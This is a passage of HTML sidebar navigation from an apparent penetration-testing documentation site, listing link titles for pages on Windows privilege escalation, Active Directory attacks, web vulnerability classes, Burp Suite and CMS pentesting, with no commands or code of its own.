                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/">WinRM (Windows Remote Management) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/protocol/rdp-pentesting/">RDP (Remote Desktop Protocol) Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Privilege Escalation
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/uac-windows-privilege-escalation/">UAC Windows Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/">Windows PrivEsc with Registry Keys</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/">Windows PrivEsc with SeBackupPrivilege</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/">Login Windows Shell</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/">Windows PrivEsc with AD CS</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/">Windows PrivEsc with RemotePotato</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/">Windows PrivEsc with LocalPotato</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/">Windows PrivEsc with Kerberos</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/">ManageEngine ADSelfService Plus PrivEsc</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/">Outlook Reminder Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/dumping-windows-password-hashes/">Dumping Windows Password Hashes</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/">Iperius Backup Service Privilege Escalation</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/">Windows PrivEsc with Unquoted Service Path</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/">Mimikatz</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Powershell
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/powershell/powershell/">PowerShell</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/powershell/powerview/">PowerView</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Post Exploitation
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/post-exploitation/window-pivoting/">Windows Pivoting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Forensics
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/forensics/windows-memory-dump-analysis/">Windows Memory Dump Analysis</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/forensics/reading-onedrive-logs/">Reading OneDrive Logs</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/forensics/windows-xml-eventlog/">Windows XML EventLog (EVTX)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/forensics/windows-disk-management/">Windows Disk Management</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Active Directory
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/">AS-REP Roasting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/kerberoasting-attack/">Kerberoasting Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/">LDAP (Lightweight Directory Access Protocol) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/">Shadow Credentials</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/smb-pentesting/">SMB (Server Message Block) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/">Kerberos Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/">AD CS (Active Directory Certificate Services) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/bloodhound-sharphound/">BloodHound SharpHound for Active Directory</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/dacl-attack/">DACL (Discretionary Access Control List) Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/pbcd-attack/">RBCD (Resource-Based Constrained Delegation) Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-injection/">LDAP Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/netlogon-elavasion-of-privilege/">Netlogon Elavasion of Privilege</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/">LAPS (Local Administrator Password Solution) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/windows/active-directory/ntlm-pentesting/">NTLM (New Technology LAN Manager) Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                    </ul>
                                                </div>
                                            </li>
                                        
                                    
                                        
                                        
                                            <li class="sidebar-dropdown nested  ">
                                                <button class="btn">
                                                    
                                                    Web
                                                </button>
                                                <div class="sidebar-submenu ">
                                                    <ul>
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Tool
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tool/burp-suite-troubleshooting/">Burp Suite Troubleshooting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tool/add-custom-http-headers-in-burp-suite/">Add Custom HTTP Headers in Burp Suite</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tool/automate-sequence-requests-with-burp-intruder/">Automate Sequence Requests with Burp Intruder</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tool/integrate-burp-request-and-sqlmap/">Integrate Burp Request and SQLmap</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tool/socks-proxy-in-burp-suite/">SOCKS Proxy in Burp Suite</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tool/turbo-intruder-in-burp-suite/">Turbo Intruder in Burp Suite</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/tool/how-to-use-owasp-zap/">How to Use OWASP ZAP</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Template Engine
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/">JsRender Template Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/">Pug Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Security Risk
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/">SQL Injection Cheat Sheet</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/xss/">XSS (Cross-Site Scripting)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/broken-access-control/">Broken Access Control</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack/">File Upload Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/">OS Command Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/ssrf/">SSRF (Server-Side Request Forgery)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/ssti/">SSTI (Server-Side Template Injection)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/web-cache-poisoning/">Web Cache Poisoning</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/http-request-smuggling/">HTTP Request Smuggling</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/">NoSQL Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/file-inclusion/">File Inclusion (LFI/RFI)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/">SQL Injection with Sqlmap</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/business-logic-attack/">Business Logic Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/redis-ssrf/">Redis SSRF</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-exiftool/">File Upload Attack on Exiftool</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack-on-imagemagick/">File Upload Attack on ImageMagick</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/idor-attack/">IDOR (Insecure Direct Object References) Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/client-side-javascript-validation-bypass/">Client-Side JavaScript Validation Bypass</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/web-race-condition-attack/">Web Race Condition Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/">Prototype Pollution in Server-Side</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-client-side/">Prototype Pollution in Client-Side</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/">SQL Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/latex-injection/">LaTeX Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/dom-cloberring/">DOM Cloberring</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/open-redirect/">Open Redirect</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/host-header-attack/">Host Header Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/blind-xxe/">Blind XXE</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/csrf/">CSRF (Cross-Site Request Forgery)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/php-filters-chain/">PHP Filters Chain</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/xxe/">XXE (XML External Entity)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/wkhtmltopdf-ssrf/">wkhtmltopdf SSRF</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/">XSS with Dynamic PDF</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/directory-traversal/">Directory (Path) Traversal</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/php-object-injection/">PHP Object Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/json-net-deserialization/">JSON.NET Deserialization</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/insecure-deserialization/">Insecure Deserialization</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/">CORS (Cross-Origin Resource Sharing) Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/">Node.js Deserialization Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/crlf-injection/">CRLF (Carriage Return Line Feed) Injection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/xst/">XST (Cross-Site Tracing)</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/security-risk/oauth-attack/">OAuth Attack</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Microsoft
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/microsoft/microsoft-exchange-server-pentesting/">Microsoft Exchange Server Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Method
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/">Web Content Discovery</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/">Web Login Bypass</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/bypass-client-server-side-filter/">Bypass Client/Server Side Filter</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/web-basic-pentesting/">Web Basic Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/web-registration-attack/">Web Registration Attack</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/web-server-security-misconfiguration/">Web Server Security Misconfiguration</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/waf-detection/">WAF (Web Application Firewall) Detection</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/web-vhost-enumeration/">Virtual Hosts (VHOSTS) Enumeration</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/method/http-rate-limit-bypass/">HTTP Rate Limit Bypass</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Framework
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/">Werkzeug Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/">Flask Jinja2 Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/java/spring-pentesting/">Spring Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/python/python-pickle-rce/">Python Pickle RCE</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/ruby/ruby-on-rails-pentesting/">Ruby on Rails Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/javascript/angular-pentesting/">Angular Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/python/tornado-pentesting/">Tornado Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/python/django-pentesting/">Django Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/java/spring-cloud-function-rce/">Spring Cloud Function RCE</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/java/ajp-pentesting/">AJP (Apache JServ Protocol) Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/framework/java/apache-struts-pentesting/">Apache Struts Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Elasticsearch
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/">Elasticsearch Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/elasticsearch/kibana-pentesting/">Kibana Pentesting</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Cookie
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cookie/cookie-hijacking/">Cookie Hijacking</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cookie/session-fixation/">Session Fixation</a></li>
                                                                                
                                                                            
                                                                        </ul>
                                                                    </div>
                                                                </li>
                                                            
                                                        
                                                            
                                                            
                                                                <li class="sidebar-dropdown nested  ">
                                                                    <button class="btn">
                                                                        
                                                                        Cms
                                                                    </button>
                                                                    <div class="sidebar-submenu ">
                                                                        <ul>
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/joomla-cms-pentesting/">Joomla CMS Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/wordpress-pentesting/">WordPress Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/mara-cms-pentesting/">Mara CMS Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/fuel-cms-pentesting/">FUEL CMS Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/subrion-cms-pentesting/">Subrion CMS Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/cockpit-cms-pentesting/">Cockpit CMS Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/concrete-cms-pentesting/">Concrete CMS Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
                                                                                    <li class=" "><a class="sidebar-nested-link" href="https://documentnation.github.io/docs/hdks/web/cms/typo3-pentesting/">TYPO3 Pentesting</a></li>
                                                                                
                                                                            
                                                                                
                                                                                
